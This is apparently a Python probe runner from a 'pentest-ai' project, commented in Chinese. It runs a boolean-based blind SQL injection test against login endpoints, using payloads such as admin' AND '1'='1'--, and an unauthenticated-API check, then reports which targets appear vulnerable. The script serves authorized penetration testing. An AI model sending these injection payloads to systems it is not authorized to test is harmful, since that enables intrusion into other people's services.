#!/usr/bin/env python3
"""
pentest-ai 链路 B — 无害 PoC 探针执行器
对应技术方案 7.3 节模板：sqli-boolean-probe / api-unauth-page1 等
"""
from __future__ import annotations

import json
import time
from dataclasses import asdict, dataclass
from typing import Any

import requests

TIMEOUT = 10
RATE_LIMIT_SEC = 0.35  # ≤10 req/s


@dataclass
class PoCResult:
    stepId: str
    templateId: str
    track: str
    status: str  # confirmed | fail | blocked | inconclusive
    exploitConfirmed: bool
    expectedSignal: str
    detail: dict[str, Any]
    durationMs: int


def _post_json(url: str, payload: dict) -> tuple[int, dict | str]:
    time.sleep(RATE_LIMIT_SEC)
    resp = requests.post(url, json=payload, timeout=TIMEOUT, allow_redirects=False)
    try:
        body = resp.json()
    except Exception:
        body = resp.text[:500]
    return resp.status_code, body


def sqli_boolean_probe(step_id: str, target_url: str, params: dict) -> PoCResult:
    t0 = time.time()
    true_p = params.get("truePayload", {"username": "admin' AND '1'='1'--", "password": "x"})
    false_p = params.get("falsePayload", {"username": "admin' AND '1'='2'--", "password": "x"})

    code_t, body_t = _post_json(target_url, true_p)
    code_f, body_f = _post_json(target_url, false_p)

    diff = code_t != code_f
    if isinstance(body_t, dict) and isinstance(body_f, dict):
        diff = diff or body_t.get("success") != body_f.get("success")

    status = "confirmed" if diff else "inconclusive"
    return PoCResult(
        stepId=step_id,
        templateId="sqli-boolean-probe",
        track="pentest-ai",
        status=status,
        exploitConfirmed=diff,
        expectedSignal="响应差异（布尔盲注）",
        detail={"true": {"code": code_t, "body": body_t}, "false": {"code": code_f, "body": body_f}},
        durationMs=int((time.time() - t0) * 1000),
    )


def api_unauth_page1(step_id: str, target_url: str, params: dict | None = None) -> PoCResult:
    t0 = time.time()
    time.sleep(RATE_LIMIT_SEC)
    resp = requests.get(target_url, timeout=TIMEOUT)
    ok = resp.status_code == 200
    try:
        body = resp.json()
    except Exception:
        body = {"raw": resp.text[:200]}
    return PoCResult(
        stepId=step_id,
        templateId="api-unauth-page1",
        track="pentest-ai",
        status="alternative_proof" if ok else "fail",
        exploitConfirmed=ok,
        expectedSignal="200 + 元数据",
        detail={"code": resp.status_code, "body": body},
        durationMs=int((time.time() - t0) * 1000),
    )


TEMPLATE_REGISTRY = {
    "sqli-boolean-probe": sqli_boolean_probe,
    "api-unauth-page1": api_unauth_page1,
}


def run_template(step: dict) -> PoCResult:
    fn = TEMPLATE_REGISTRY.get(step["templateId"])
    if not fn:
        return PoCResult(
            stepId=step["stepId"],
            templateId=step.get("templateId", "unknown"),
            track="pentest-ai",
            status="inconclusive",
            exploitConfirmed=False,
            expectedSignal="",
            detail={"error": "unknown template"},
            durationMs=0,
        )
    return fn(step["stepId"], step["targetUrl"], step.get("params", {}))


def main() -> None:
    import argparse
    from pathlib import Path

    parser = argparse.ArgumentParser(description="pentest-ai 无害 PoC 探针")
    parser.add_argument("--plan", type=Path, required=True)
    args = parser.parse_args()
    plan = json.loads(args.plan.read_text(encoding="utf-8"))
    results = []
    for step in plan["steps"]:
        if step.get("track") != "pentest-ai":
            continue
        results.append(run_template(step))
    print(json.dumps([asdict(r) for r in results], ensure_ascii=False, indent=2))


if __name__ == "__main__":
    main()
